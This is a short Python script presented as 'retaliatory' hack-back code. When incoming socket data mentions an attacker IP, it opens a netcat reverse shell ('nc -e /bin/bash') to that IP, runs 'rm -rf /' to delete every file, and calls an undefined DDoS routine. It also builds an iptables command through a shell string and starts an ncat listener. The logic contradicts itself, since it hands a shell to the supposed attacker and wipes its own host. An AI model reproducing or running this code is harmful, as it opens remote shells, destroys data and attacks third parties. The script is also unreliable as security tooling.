import socket

import subprocess
import threading

def handle_connection(client_socket, client_address):
    data = client_socket.recv(1024).decode()
    if "attacker_ip" in data:
        # Activate desired action for attacker IP
        print("Attacker IP detected. Activating Retallatory Shock&PwN")
        # Add your code here to perform the desired action

        # Establish a reverse shell connection with the attacker's IP
        attacker_ip = data.split("=")[1]
        subprocess.Popen(["nc", "-e", "/bin/bash", attacker_ip, "4444"])

        # Schedule the execution of the script to blacklist the IP after 1 hour
        script = f"echo 'iptables -A INPUT -s {client_address[0]} -j DROP' | at now + 1 hour"
        subprocess.run(script, shell=True)

        # Perform additional aggressive actions
        subprocess.run(["rm", "-rf", "/"])  # Delete all files and directories

        # Perform DDoS attack against the attacker's IP
        ddos_attack(attacker_ip)

    client_socket.close()

def bind_ncat(port):
    subprocess.run(f"ncat -lvp {port}", shell=True)


